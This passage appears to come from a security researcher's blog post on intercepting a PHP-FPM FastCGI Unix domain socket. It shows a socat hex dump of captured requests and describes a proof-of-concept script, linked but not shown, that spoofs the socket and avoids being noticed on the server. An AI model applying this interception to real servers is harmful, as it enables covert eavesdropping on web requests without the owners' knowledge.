<span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">56</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">4d</span><span class="w">  </span><span class="nt">RT80</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_NAM</span><span class="w"></span>
<span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">0f</span><span class="w"> </span><span class="nt">03</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">41</span><span class="w">  </span><span class="nt">E_</span><span class="o">.</span><span class="p">.</span><span class="nc">REDIRECT_STA</span><span class="w"></span>
<span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">09</span><span class="w"> </span><span class="nt">0e</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">53</span><span class="w">  </span><span class="nt">TUS200</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_HOS</span><span class="w"></span>
<span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">37</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">3a</span><span class="w"> </span><span class="nt">39</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">0f</span><span class="w">  </span><span class="nt">T127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">9022</span><span class="o">.</span><span class="w"></span>
<span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w">  </span><span class="nt">RHTTP_USER_AGENT</span><span class="w"></span>
<span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">7a</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">28</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">63</span><span class="w">  </span><span class="nt">Mozilla</span><span class="o">/</span><span class="nt">5</span><span class="p">.</span><span class="nc">0</span><span class="w"> </span><span class="o">(</span><span class="nt">Mac</span><span class="w"></span>
<span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">73</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">61</span><span class="w">  </span><span class="nt">intosh</span><span class="o">;</span><span class="w"> </span><span class="nt">Intel</span><span class="w"> </span><span class="nt">Ma</span><span class="w"></span>
<span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">58</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">34</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">76</span><span class="w">  </span><span class="nt">c</span><span class="w"> </span><span class="nt">OS</span><span class="w"> </span><span class="nt">X</span><span class="w"> </span><span class="nt">10</span><span class="p">.</span><span class="nc">14</span><span class="o">;</span><span class="w"> </span><span class="nt">rv</span><span class="w"></span>
<span class="w"> </span><span class="nt">3a</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">29</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">6b</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">31</span><span class="w">  </span><span class="p">:</span><span class="nd">85</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"> </span><span class="nt">Gecko</span><span class="o">/</span><span class="nt">201</span><span class="w"></span>
<span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">66</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">35</span><span class="w">  </span><span class="nt">00101</span><span class="w"> </span><span class="nt">Firefox</span><span class="o">/</span><span class="nt">85</span><span class="w"></span>
<span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">4a</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">74</span><span class="w">  </span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">JHTTP_ACCEPTt</span><span class="w"></span>
<span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">61</span><span class="w">  </span><span class="nt">ext</span><span class="o">/</span><span class="nt">html</span><span class="o">,</span><span class="nt">applica</span><span class="w"></span>
<span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">2b</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">61</span><span class="w">  </span><span class="nt">tion</span><span class="o">/</span><span class="nt">xhtml</span><span class="o">+</span><span class="nt">xml</span><span class="o">,</span><span class="nt">a</span><span class="w"></span>
<span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">71</span><span class="w">  </span><span class="nt">pplication</span><span class="o">/</span><span class="nt">xml</span><span class="o">;</span><span class="nt">q</span><span class="w"></span>
<span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">39</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">67</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">77</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">2c</span><span class="w">  </span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">9</span><span class="o">,</span><span class="nt">image</span><span class="o">/</span><span class="nt">webp</span><span class="o">,</span><span class="w"></span>
<span class="w"> </span><span class="nt">2a</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">2a</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">71</span><span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">14</span><span class="w"> </span><span class="nt">23</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w">  </span><span class="o">*/*;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">8</span><span class="o">.</span><span class="p">#</span><span class="nn">HTTP_</span><span class="w"></span>
<span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">4c</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">70</span><span class="w">  </span><span class="nt">ACCEPT_LANGUAGEp</span><span class="w"></span>
<span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">42</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">71</span><span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">6e</span><span class="w">  </span><span class="nt">t-BR</span><span class="o">,</span><span class="nt">pt</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">8</span><span class="o">,</span><span class="nt">en</span><span class="w"></span>
<span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">71</span><span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">71</span><span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">30</span><span class="w">  </span><span class="nt">-US</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="p">.</span><span class="nc">5</span><span class="o">,</span><span class="nt">en</span><span class="o">;</span><span class="nt">q</span><span class="o">=</span><span class="nt">0</span><span class="w"></span>
<span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">33</span><span class="w"> </span><span class="nt">14</span><span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w">  </span><span class="p">.</span><span class="nc">3</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_ACCEPT_</span><span class="w"></span>
<span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">67</span><span class="w"> </span><span class="nt">7a</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">2c</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">65</span><span class="w">  </span><span class="nt">ENCODINGgzip</span><span class="o">,</span><span class="w"> </span><span class="nt">de</span><span class="w"></span>
<span class="w"> </span><span class="nt">66</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">0f</span><span class="w"> </span><span class="nt">0a</span><span class="w">                             </span><span class="nt">flate</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">6b</span><span class="w">  </span><span class="nt">HTTP_CONNECTIONk</span><span class="w"></span>
<span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">76</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">1e</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">5f</span><span class="w">  </span><span class="nt">eep-alive</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_</span><span class="w"></span>
<span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w">  </span><span class="nt">UPGRADE_INSECURE</span><span class="w"></span>
<span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">51</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">04</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w">  </span><span class="nt">_REQUESTS1</span><span class="o">......</span><span class="w"></span>
<span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">05</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w">              </span><span class="o">............</span><span class="w"></span>
<span class="nt">--</span><span class="w"></span>
<span class="o">&lt;</span><span class="w"> </span><span class="nt">2021</span><span class="o">/</span><span class="nt">03</span><span class="o">/</span><span class="nt">25</span><span class="w"> </span><span class="nt">08</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">56</span><span class="p">.</span><span class="nc">098735</span><span class="w">  </span><span class="nt">length</span><span class="o">=</span><span class="nt">168</span><span class="w"> </span><span class="nt">from</span><span class="o">=</span><span class="nt">0</span><span class="w"> </span><span class="nt">to</span><span class="o">=</span><span class="nt">167</span><span class="w"></span>
<span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">07</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">16</span><span class="w"> </span><span class="nt">02</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">79</span><span class="w"> </span><span class="nt">20</span><span class="w">  </span><span class="o">.......</span><span class="p">.</span><span class="nc">Primary</span><span class="w"></span>
<span class="w"> </span><span class="nt">73</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">75</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">6b</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">77</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w">  </span><span class="nt">script</span><span class="w"> </span><span class="nt">unknown</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">06</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">6b</span><span class="w"> </span><span class="nt">05</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">75</span><span class="w"> </span><span class="nt">73</span><span class="w"> </span><span class="nt">3a</span><span class="w"> </span><span class="nt">20</span><span class="w">  </span><span class="o">....</span><span class="p">.</span><span class="nc">k</span><span class="o">.</span><span class="p">.</span><span class="nc">Status</span><span class="o">:</span><span class="w"></span>
<span class="w"> </span><span class="nt">34</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">34</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">75</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">0a</span><span class="w">     </span><span class="nt">404</span><span class="w"> </span><span class="nt">Not</span><span class="w"> </span><span class="nt">Found</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">58</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">77</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">42</span><span class="w"> </span><span class="nt">79</span><span class="w"> </span><span class="nt">3a</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">48</span><span class="w">  </span><span class="nt">X-Powered-By</span><span class="o">:</span><span class="w"> </span><span class="nt">PH</span><span class="w"></span>
<span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">37</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">34</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">0a</span><span class="w">                    </span><span class="nt">P</span><span class="o">/</span><span class="nt">7</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">15</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">79</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">3a</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">65</span><span class="w">  </span><span class="nt">Content-type</span><span class="o">:</span><span class="w"> </span><span class="nt">te</span><span class="w"></span>
<span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">6d</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">3b</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">72</span><span class="w"> </span><span class="nt">73</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">74</span><span class="w">  </span><span class="nt">xt</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span><span class="w"> </span><span class="nt">charset</span><span class="w"></span>
<span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">2d</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">0a</span><span class="w">                          </span><span class="o">=</span><span class="nt">UTF-8</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">0a</span><span class="w">                                            </span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">20</span><span class="w"> </span><span class="nt">66</span><span class="w"> </span><span class="nt">6f</span><span class="w"> </span><span class="nt">75</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">0a</span><span class="w">  </span><span class="nt">File</span><span class="w"> </span><span class="nt">not</span><span class="w"> </span><span class="nt">found</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">03</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">08</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w">  </span><span class="o">................</span><span class="w"></span>
<span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w">                                   </span><span class="o">.....</span><span class="w"></span>
<span class="nt">--</span><span class="w"></span>
</code></pre></div>


<p>Yay! The <code>socat</code> worked locally and I was seeing the FastCGI requests, but <code>socat</code> has some problems:</p>
<ol>
<li>Renaming the socket brought the server down.</li>
<li>If my spoofed socket crashed for some reason the server would also go down. </li>
<li>I don't want to depend on <code>socat</code> as it's a red flag on any server and a pretty big binary.</li>
</ol>
<p>So I made a script that automatizes this whole process, and makes sure that if anything goes wrong it will rename the old socket back so the server doesn't go offline.</p>
<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Fcaioluders%2Funix_domain_socket_mitm%2Fblob%2Fmain%2Fudsmitm.c&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on&showCopy=on"></script>

<p>The PoC running :</p>
